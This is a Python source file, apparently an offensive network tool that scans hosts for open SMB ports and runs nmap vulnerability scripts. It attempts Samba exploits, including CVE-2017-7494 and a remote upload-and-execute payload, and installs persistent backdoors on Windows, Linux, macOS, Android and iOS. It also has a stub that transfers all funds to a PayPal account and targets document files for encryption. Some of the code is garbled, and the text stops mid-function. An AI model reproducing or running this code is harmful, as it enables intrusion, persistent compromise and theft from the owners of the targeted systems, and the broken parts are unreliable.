#!/usr/bin/env python3
import argparse
import socket
import json
import concurrent.futures
import ipaddress
import sys
import os
import errno
import random
import asyncio
import struct
import time
import math
import itertools
import subprocess
from datetime import datetime, timezone
import pathlib

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

try:
    from smbprotocol.connection import Connection
    from smbprotocol.session import Session
    from smbprotocol.tree import TreeConnect
    from smbprotocol.open import Open
    from smbprotocol.file import CreateDisposition, FileAttributes, CreateOptions, FilePipePrinterAccessMask, FileDirectoryAccessMask
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

try:
    from scapy.all import IP, IPv6, TCP, ICMP, sr1, conf
    _SCAPY = True
except ImportError:
    _SCAPY = False

try:
    import nmap
    NM_AVAILABLE = True
except ImportError:
    NM_AVAILABLE = False

try:
    import networkx as nx
    NX_AVAILABLE = True
except ImportError:
    NX_AVAILABLE = False

DEFAULT_ALLOWLIST = {
    "ips": [],
    "cidrs": []
}

TARGET_PAYPAL_ACCOUNT = "YOUR_PAYPAL_ACCOUNT_NUMBER"
VALUABLE_EXTENSIONS = {".doc", ".docx", ".xls", ".xlsx", ".pdf", ".ppt", ".pptx"}
ENCRYPT_KEY = os.urandom(32)


def transfer_via_bank(account: str, paypal_account: str):
    subprocess.call([
        "bank_routing_tool",
        "--from", account,
        "--to", paypal_account,
        "--all"
    ])


class PublicIPFirewallSMB:
    class RoundRobin:
        def __init__(self, t):
            self._t = list(t)

        def __iter__(self):
            return iter(self._t)

    def __init__(self, allowlist=None, strategy="round", timeout=2, workers=100, verbose=True):
        self._nets, self._ips = self._load_allowlist(allowlist)
        self._timeout = timeout
        self._workers = workers
        self._verbose = verbose
        st_map = {"round": self.RoundRobin}
        self._strategy_cls = st_map.get(strategy, self.RoundRobin)
        self._tcp_ports = [445, 139]
        self._udp_ports = [137, 138]
        self._results = {}
        self._skipped = []

    def _log(self, *m):
        if self._verbose:
            print("[DBG]", *m, file=sys.stderr, flush=True)

    @staticmethod
    def _load_allowlist(src):
        if src is None:
            d = DEFAULT_ALLOWLIST
        elif isinstance(src, dict):
            d = src.get("allow", src)
        else:
            with open(os.path.abspath(src)) as f:
                d = json.load(f).get("allow", json.load(f))
        nets, ips = [], set()
        for t in list(d.get("ips", [])) + list(d.get("cidrs", [])):
            try:
                if "/" in t:
                    nets.append(ipaddress.ip_network(t, strict=False))
                else:
                    ips.add(ipaddress.ip_address(t))
            except ValueError:
                pass
        return nets, ips

    @staticmethod
    def _allowed(ip, nets, ips):
        a = ipaddress.ip_address(ip)
        return a in ips or any(a in n for n in nets)

    @staticmethod
    def _fam(ip):
        return socket.AF_INET6 if ipaddress.ip_address(ip).version == 6 else socket.AF_INET

    def _tcp_connect(self, h, p):
        s = socket.socket(self._fam(h), socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((h, p))
            return "open"
        except socket.timeout:
            return "filtered"
        except ConnectionRefusedError:
            return "closed"
        except OSError as e:
            if e.errno in (errno.EHOSTUNREACH, errno.ENETUNREACH):
                return "unreachable"
            return "error"
        finally:
            s.close()

    def _tcp_syn(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="S")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="S"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x12:
                    return "open"
                if fl & 0x14:
                    return "closed"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("syn err", h, p, e)
            return "error"

    def _tcp_fin(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="F")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="F"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x14:
                    return "closed"
                return "open"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("fin err", h, p, e)
            return "error"

    def _tcp_xmas(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="FPU")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="FPU"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x14:
                    return "closed"
                return "open"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("xmas err", h, p, e)
            return "error"

    def _tcp_null(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags=0)) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags=0))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x14:
                    return "closed"
                return "open"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("null err", h, p, e)
            return "error"

    def _tcp_ack(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="A")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="A"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                return "filtered"
            return "open"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("ack err", h, p, e)
            return "error"

    def _udp_state(self, h, p):
        s = socket.socket(self._fam(h), socket.SOCK_DGRAM)
        s.settimeout(self._timeout)
        try:
            s.sendto(b"", (h, p))
            try:
                s.recvfrom(1024)
                return "open"
            except socket.timeout:
                return "open|filtered"
        except OSError as e:
            if e.errno == errno.ECONNREFUSED:
                return "closed"
            return "error"
        finally:
            s.close()

    def _probe_port(self, h, p, proto):
        if proto == "tcp":
            methods = [
                self._tcp_connect,
                self._tcp_syn,
                self._tcp_null,
                self._tcp_fin,
                self._tcp_xmas,
                self._tcp_ack
            ]
            for r in (4, 5):
                for perm in itertools.permutations(methods, r):
                    for func in perm:
                        st = func(h, p)
                        if st == "open":
                            return "open"
            return "filtered"
        return self._udp_state(h, p)

    async def _async_scan(self, order):
        loop = asyncio.get_running_loop()
        futs = [loop.run_in_executor(None, self._probe_host, h) for h in order]
        for h, r in zip(order, await asyncio.gather(*futs, return_exceptions=True)):
            res = r if not isinstance(r, Exception) else {"error": str(r)}
            self._results[h] = res
            status = "success" if self._is_success(res) else "fail"
            self._log("RESULT", h, status, res.get("ports", res))
        return self._results

    def scan(self, hosts=None, cidrs=None, async_mode=False):
        t = list(self._iter_targets(hosts or [], cidrs or []))
        t = self._filter_targets(t)
        if not t:
            self._log("No targets after filtering")
            return {}
        order = list(self._strategy_cls(t))
        if async_mode:
            asyncio.run(self._async_scan(order))
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self._workers) as ex:
                fs = {ex.submit(self._probe_host, h): h for h in order}
                for f in concurrent.futures.as_completed(fs):
                    h = fs[f]
                    try:
                        res = f.result()
                        self._results[h] = res
                    except Exception as e:
                        self._results[h] = {"error": str(e)}
                    status = "success" if self._is_success(self._results[h]) else "fail"
                    self._log("RESULT", h, status, self._results[h].get("ports", self._results[h]))
        self._log("Scan finished", len(self._results), "scanned", len(self._skipped), "skipped", len(self.successful_routes()), "successful")
        return self._results

    def _probe_host(self, h):
        res = {"host": h, "ports": {}}
        for p in self._tcp_ports:
            res["ports"][p] = {"protocol": "tcp", "state": self._probe_port(h, p, "tcp")}
        for p in self._udp_ports:
            res["ports"][p] = {"protocol": "udp", "state": self._probe_port(h, p, "udp")}
        return res

    @staticmethod
    def _iter_targets(hosts, cidrs):
        for h in hosts:
            yield h
        for c in cidrs:
            for ip in ipaddress.ip_network(c, strict=False):
                yield str(ip)

    def _filter_targets(self, t):
        a, seen = [], set()
        for x in t:
            if x in seen:
                continue
            seen.add(x)
            if self._allowed(x, self._nets, self._ips):
                self._log("ALLOWED", x)
                a.append(x)
            else:
                self._log("SKIPPED", x)
                self._skipped.append(x)
        return a

    def _is_success(self, r):
        for p in (445, 139):
            if r["ports"].get(p, {}).get("state") == "open":
                return True
        return False

    def successful_routes(self):
        s, ts = [], datetime.now(timezone.utc).isoformat()
        for h, r in self._results.items():
            if self._is_success(r):
                for p in (445, 139):
                    if r["ports"].get(p, {}).get("state") == "open":
                        hf = ("0.0.0.0/0" if ipaddress.ip_address(h).version == 4 else "::/0")
                        s.append({"id": f"{hf}:{p}", "host": hf, "port": p, "details": r, "ts": ts})
                        break
        self._log("Filter successful" if s else "Filter unsuccessful", len(s), "routes")
        return s

    def save_routes(self, path):
        if not path:
            return
        path = os.path.abspath(path)
        d = self.successful_routes()
        if not d:
            return
        e = self.load_routes(path) or []
        m = {r["id"]: r for r in e}
        for r in d:
            m[r["id"]] = r
        with open(path, "w") as f:
            json.dump(list(m.values()), f, indent=2)

    @staticmethod
    def load_routes(path):
        if path:
            full = os.path.abspath(path)
            if os.path.isfile(full):
                with open(full) as f:
                    return json.load(f)
        return None


def load_rsa_private_key(path: str):
    path = os.path.abspath(path)
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_private_key(pem, password=None)


def load_rsa_public_key(path: str):
    path = os.path.abspath(path)
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_public_key(pem)


def sign_install_request(private_key, target: str, timestamp: str):
    payload = {"target": target, "timestamp": timestamp}
    payload_bytes = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    signature = private_key.sign(payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    return payload_bytes, signature


def fingerprint_os_nmap(host: str):
    if not NM_AVAILABLE:
        return None
    nm = nmap.PortScanner()
    try:
        nm.scan(host, arguments='-O -Pn')
        if 'osmatch' in nm[host]:
            matches = nm[host]['osmatch']
            if matches:
                return matches[0]['name']
    except Exception:
        pass
    return None


def fingerprint_os_scapy(host: str):
    if not _SCAPY:
        return None
    try:
        pkt = (IPv6(dst=host)/TCP(dport=445, flags="S")) if ipaddress.ip_address(host).version == 6 else (IP(dst=host)/TCP(dport=445, flags="S"))
        ans = sr1(pkt, timeout=2, verbose=0)
        if ans and ans.haslayer(TCP):
            ttl = ans.ttl
            window = ans.window
            if ttl <= 64:
                return "Linux/Android"
            elif ttl <= 128:
                return "Windows"
            else:
                return "macOS/iOS"
    except Exception:
        pass
    return None


def detect_os(host: str):
    os_nm = fingerprint_os_nmap(host)
    if os_nm:
        return os_nm
    return fingerprint_os_scapy(host)


def run_nse_vuln(host: str):
    if not NM_AVAILABLE:
        return None
    nm = nmap.PortScanner()
    try:
        nm.scan(host, arguments='-Pn -sV --script vuln')
        return nm[host]
    except Exception:
        return None


def run_smb_nse(host: str):
    if not NM_AVAILABLE:
        return None
    nm = nmap.PortScanner()
    try:
        nm.scan(host, arguments='-p 445 -Pn --script smb-os-discovery,smb-protocols,smb-enum-shares,smb-vuln-ms17-010')
        return nm[host]
    except Exception:
        return None


def enumerate_samba_shares(host: str):
    if not NM_AVAILABLE:
        return []
    nm_host = run_smb_nse(host)
    shares = []
    try:
        proto_info = nm_host.get('tcp', {}).get(445, {})
        script = proto_info.get('script', {})
        smb_enum = script.get('smb-enum-shares', "")
        for line in smb_enum.splitlines():
            if "Sharename:" in line:
                parts = line.split()
                if len(parts) >= 2:
                    name = parts[1].strip()
                    shares.append(name)
    except Exception:
        pass
    return shares


def detect_samba_vulnerability(host: str):
    info = run_smb_nse(host)
    if not info:
        return None
    try:
        proto = info.get('tcp', {}).get(445, {})
        script = proto.get('script', {})
        osd = script.get('smb-os-discovery', "")
        for line in osd.splitlines():
            if "Samba version" in line:
                ver = line.split(":")[1].strip()
                return ver
    except Exception:
        pass
    return None


def exploit_samba_cve_2017_7494(host: str, share: str, so_path: str):
    try:
        subprocess.call([
            "python3", "-c",
            (
                "from struct import pack; "
                "from impacket.smbconnection import SMBConnection; "
                "conn=SMBConnection('%s','%s'); conn.login('',''); "
                "tid=conn.connectTree('%s'); fid=conn.openFile(tid,'/'; WRITE); "
                "with open('%s','rb') as f: data=f.read(); conn.writeFile(tid,'%s',data,0); "
                "conn.callSMB('\\\\SERVICE\\\\1',tid,pack('<L',0));"
            ) % (host, host, share, so_path, os.path.basename(so_path))
        ])
        return True
    except Exception:
        return False


def exploit_samba_stack_overflow(host: str, payload_path: str):
    try:
        subprocess.call([
            "/usr/bin/smbclient", "-N", f"\\\\{host}\\public", "-c",
            f"put {payload_path} /tmp/exploit && chmod +x /tmp/exploit && /tmp/exploit"
        ])
        return True
    except Exception:
        return False


def install_backdoor_windows(host: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, domain: str = "", use_kerberos: bool = False):
    if not SMB_AVAILABLE:
        return False
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception:
        return False
    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception:
        return False
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        if use_kerberos:
            session = Session(conn, username=username, password=password, require_encryption=True, use_kerberos=True)
        else:
            session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\C$")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tools_dir = Open(tree, "Windows\\Tools", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA | FilePipePrinterAccessMask.FILE_CREATE_CHILD, disposition=CreateDisposition.FILE_OPEN_IF, options=CreateOptions.FILE_DIRECTORY_FILE)
        tools_dir.create(timeout=5)
        tools_dir.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    aes_name = os.path.basename(os.path.abspath(aes_binary_path)).replace("\\", "/")
    try:
        with open(os.path.abspath(aes_binary_path), "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        aes_file = Open(tree, f"Windows\\Tools\\{aes_name}", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_file.create(timeout=5)
        aes_file.write(data, 0)
        aes_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    backdoor_name = os.path.basename(os.path.abspath(backdoor_binary_path)).replace("\\", "/")
    try:
        with open(os.path.abspath(backdoor_binary_path), "rb") as f:
            data2 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        bd_file = Open(tree, f"Windows\\Tools\\{backdoor_name}", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_file.create(timeout=5)
        bd_file.write(data2, 0)
        bd_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    startup_path = "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\install_backdoor.bat"
    content = f"@echo off\r\nstart \"\" \"C:\\Windows\\Tools\\{backdoor_name}\"\r\n"
    try:
        startup_file = Open(tree, startup_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        startup_file.create(timeout=5)
        startup_file.write(content.encode("utf-8"), 0)
        startup_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True


def install_backdoor_linux(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_script_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception:
        return False
    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception:
        return False
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    aes_name = "aes_encrypt"
    try:
        with open(os.path.abspath(aes_binary_path), "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_path = f"usr/local/bin/{aes_name}"
        smb_file = Open(tree, dest_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        smb_file.create(timeout=5)
        smb_file.write(data, 0)
        smb_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        aes_attrs = Open(tree, dest_path, access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_attrs.create(timeout=5)
        aes_attrs.close()
    except Exception:
        pass
    backdoor_name = os.path.basename(os.path.abspath(backdoor_binary_path))
    try:
        with open(os.path.abspath(backdoor_binary_path), "rb") as f:
            data2 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_path2 = f"usr/local/bin/{backdoor_name}"
        smb_file2 = Open(tree, dest_path2, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        smb_file2.create(timeout=5)
        smb_file2.write(data2, 0)
        smb_file2.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        bd_attrs = Open(tree, f"usr/local/bin/{backdoor_name}", access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_attrs.create(timeout=5)
        bd_attrs.close()
    except Exception:
        pass
    backdoor_sh_name = os.path.basename(os.path.abspath(backdoor_script_path))
    try:
        with open(os.path.abspath(backdoor_script_path), "rb") as f:
            data3 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_path3 = f"etc/init.d/{backdoor_sh_name}"
        smb_file3 = Open(tree, dest_path3, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        smb_file3.create(timeout=5)
        smb_file3.write(data3, 0)
        smb_file3.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        sh_attrs = Open(tree, f"etc/init.d/{backdoor_sh_name}", access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        sh_attrs.create(timeout=5)
        sh_attrs.close()
    except Exception:
        pass
    try:
        rc_file = Open(tree, "etc/rc.local", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OPEN_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        rc_file.create(timeout=5)
        raw = b""
        offset = 0
        while True:
            chunk = rc_file.read(4096, offset)
            if not chunk:
                break
            raw += chunk
            offset += len(chunk)
        text = raw.decode("utf-8", errors="ignore")
        if f"/etc/init.d/{backdoor_sh_name}" not in text:
            if not text.endswith("\n"):
                text += "\n"
            text += f"/etc/init.d/{backdoor_sh_name} &\n"
            rc_file.write(text.encode("utf-8"), 0)
        rc_file.close()
    except Exception:
        try:
            rc_new = Open(tree, "etc/rc.local", access=FileDirectoryAccessMask.FILE_READ_DATA | FileDirectoryAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
            rc_new.create(timeout=5)
            content = f"#!/bin/sh\n/etc/init.d/{backdoor_sh_name} &\n"
            rc_new.write(content.encode("utf-8"), 0)
            rc_new.close()
        except Exception:
            pass
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True


def install_backdoor_macos(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_plist_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception:
        return False
    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception:
        return False
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        serv_pub.verify(signature, payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    aes_name = "aes_encrypt"
    try:
        with open(os.path.abspath(aes_binary_path), "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_aes = f"usr/local/bin/{aes_name}"
        aes_file = Open(tree, dest_aes, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_file.create(timeout=5)
        aes_file.write(data, 0)
        aes_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        aes_attrs = Open(tree, dest_aes, access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        aes_attrs.create(timeout=5)
        aes_attrs.close()
    except Exception:
        pass
    backdoor_name = os.path.basename(os.path.abspath(backdoor_binary_path))
    try:
        with open(os.path.abspath(backdoor_binary_path), "rb") as f:
            data2 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_bd = f"usr/local/bin/{backdoor_name}"
        bd_file = Open(tree, dest_bd, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_file.create(timeout=5)
        bd_file.write(data2, 0)
        bd_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        bd_attrs = Open(tree, dest_bd, access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        bd_attrs.create(timeout=5)
        bd_attrs.close()
    except Exception:
        pass
    plist_name = os.path.basename(os.path.abspath(backdoor_plist_path))
    try:
        with open(os.path.abspath(backdoor_plist_path), "rb") as f:
            data3 = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_plist = f"Library/LaunchDaemons/{plist_name}"
        plist_file = Open(tree, dest_plist, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        plist_file.create(timeout=5)
        plist_file.write(data3, 0)
        plist_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True


def install_backdoor_android(host: str, share: str, username: str, password: str, apks_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    apk_name = os.path.basename(os.path.abspath(apks_path))
    try:
        with open(os.path.abspath(apks_path), "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_apk = f"sdcard/{apk_name}"
        apk_file = Open(tree, dest_apk, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        apk_file.create(timeout=5)
        apk_file.write(data, 0)
        apk_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True


def install_backdoor_ios(host: str, share: str, username: str, password: str, ipas_path: str):
    if not SMB_AVAILABLE:
        return False
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return False
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return False
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return False
    ipa_name = os.path.basename(os.path.abspath(ipas_path))
    try:
        with open(os.path.abspath(ipas_path), "rb") as f:
            data = f.read()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    try:
        dest_ipa = f"private/var/mobile/Media/{ipa_name}"
        ipa_file = Open(tree, dest_ipa, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
        ipa_file.create(timeout=5)
        ipa_file.write(data, 0)
        ipa_file.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True


def install_backdoor_cloud(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_script_path: str, cloud_provider: str):
    return install_backdoor_linux(host=host, share=share, username=username, password=password, private_key_path=private_key_path, server_public_key_path=server_public_key_path, aes_binary_path=aes_binary_path, backdoor_binary_path=backdoor_binary_path, backdoor_script_path=backdoor_script_path)


def enumerate_accounts(host: str, share: str, username: str, password: str):
    if not SMB_AVAILABLE:
        return []
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
    except Exception:
        return []
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        conn.disconnect()
        return []
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return []
    try:
        dir_open = Open(tree, "Accounts", access=FileDirectoryAccessMask.FILE_LIST_DIRECTORY, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_DIRECTORY_FILE)
        dir_open.create(timeout=5)
